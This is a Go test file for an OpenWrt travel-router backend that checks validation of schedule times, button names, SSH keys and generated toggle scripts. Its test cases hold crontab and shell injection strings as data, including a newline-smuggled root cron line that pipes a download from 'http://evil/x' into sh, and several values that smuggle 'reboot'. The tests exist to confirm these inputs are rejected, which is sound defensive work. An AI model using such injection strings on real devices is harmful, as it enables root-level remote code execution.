package services

import (
	"strings"
	"testing"

	"github.com/openwrt-travel-gui/backend/internal/models"
)

func TestValidateHHMM(t *testing.T) {
	cases := []struct {
		in      string
		wantErr bool
	}{
		{"00:00", false},
		{"07:30", false},
		{"23:59", false},
		{"24:00", true},
		{"7:30", true},
		{"07:60", true},
		{"0730", true},
		{"", true},
		// crontab injection attempts (P0: root RCE via crontab)
		{"00:00\n* * * * root /bin/sh -c 'wget -qO- http://evil/x|sh' #", true},
		{"00:00\r\n* * * * root reboot", true},
		{"00:00 * * * *", true},
		{"00:00; reboot", true},
		{"$(reboot)", true},
	}
	for _, tc := range cases {
		err := ValidateHHMM(tc.in)
		if (err != nil) != tc.wantErr {
			t.Errorf("ValidateHHMM(%q) err=%v, wantErr=%v", tc.in, err, tc.wantErr)
		}
	}
}

func TestValidateButtonName(t *testing.T) {
	discovered := []string{"POWER", "volume_up", "reset-factory"}
	cases := []struct {
		name    string
		dis     []string
		wantErr bool
	}{
		{"POWER", discovered, false},
		{"volume_up", discovered, false},
		{"reset-factory", discovered, false},
		{"", discovered, true},
		{"NOT_A_BUTTON", discovered, true},
		{"POWER; reboot", discovered, true},
		{"POWER)\n  reboot)\n    reboot\n  x)", discovered, true},
		{"POWER\n", discovered, true},
		{"POWER", nil, false}, // no devicetree labels: charset check only
		{"POWER; reboot", nil, true},
	}
	for _, tc := range cases {
		err := ValidateButtonName(tc.name, tc.dis)
		if (err != nil) != tc.wantErr {
			t.Errorf("ValidateButtonName(%q, %v) err=%v, wantErr=%v", tc.name, tc.dis, err, tc.wantErr)
		}
	}
}

func TestAddSSHKeyRejectsMultilineAndGarbage(t *testing.T) {
	s := NewSystemService(nil, nil, nil)
	if err := s.AddSSHKey("ssh-ed25519 AAAA user@host\nssh-rsa AAAA evil@host"); err == nil {
		t.Error("expected multi-line key to be rejected")
	}
	if err := s.AddSSHKey("not a key"); err == nil {
		t.Error("expected malformed key to be rejected")
	}
}

func TestBuildButtonHotplugScriptHasNoWifiCommands(t *testing.T) {
	script := buildButtonHotplugScript([]models.HardwareButton{
		{Name: "POWER", Action: models.ButtonActionWifiToggle},
		{Name: "volume_up", Action: models.ButtonActionVPNToggle},
	})
	for _, forbidden := range []string{"wifi up", "wifi down", "wifi reload"} {
		if strings.Contains(script, forbidden) {
			t.Errorf("hotplug script must not contain %q:\n%s", forbidden, script)
		}
	}
	if !strings.Contains(script, wirelessToggleScriptPath) {
		t.Errorf("hotplug script should delegate to the toggle helper:\n%s", script)
	}
}

func TestWirelessToggleScriptIsUCIOnly(t *testing.T) {
	// Comments may name the forbidden commands; the executed lines may not.
	code := make([]string, 0, 32)
	for _, line := range strings.Split(wirelessToggleScript, "\n") {
		if strings.HasPrefix(strings.TrimSpace(line), "#") {
			continue
		}
		code = append(code, line)
	}
	joined := strings.Join(code, "\n")
	for _, forbidden := range []string{"wifi up", "wifi down", "wifi reload"} {
		if strings.Contains(joined, forbidden) {
			t.Errorf("toggle script must not execute %q", forbidden)
		}
	}
	for _, want := range []string{"uci -q commit wireless", "uci apply", "uci confirm", "GUARD"} {
		if !strings.Contains(joined, want) {
			t.Errorf("toggle script missing %q", want)
		}
	}
}
